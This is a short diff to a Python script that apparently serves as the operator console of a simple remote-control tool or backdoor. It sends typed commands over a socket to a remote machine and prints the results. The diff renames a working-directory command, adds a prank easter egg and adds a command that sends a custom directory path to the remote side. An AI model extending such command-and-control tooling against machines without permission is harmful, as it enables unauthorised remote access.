@@ -22,9 +22,9 @@ while 1:
 
     command = input(str("3NT3R Y0UR C0MM4ND >> "))
 
-#view_cwd - what dir am I in
+#whereami - what dir am I in
 
-    if command == "view_cwd":
+    if command == "whereami":
         conn.send(command.encode())
         print("")
         print("Command sent, waiting for 3X3CUT10N")
@@ -33,6 +33,18 @@ while 1:
         files = files.decode()
         print("Command output: ", files)
 
+    elif command == "pepino":
+        print("Welcome back fellow Plewako house member, your server is running @ ", host)
+        print("")
+        print("nope just a prank.")
+
+    elif command == "custom_dir":
+        conn.send(command.encode())
+        print("")
+        user_input = input(str("CustomD1R: "))
+        conn.send(user_input.encode())
+        print("Command has been sent")
+        print("")
 
     else:
         print("")
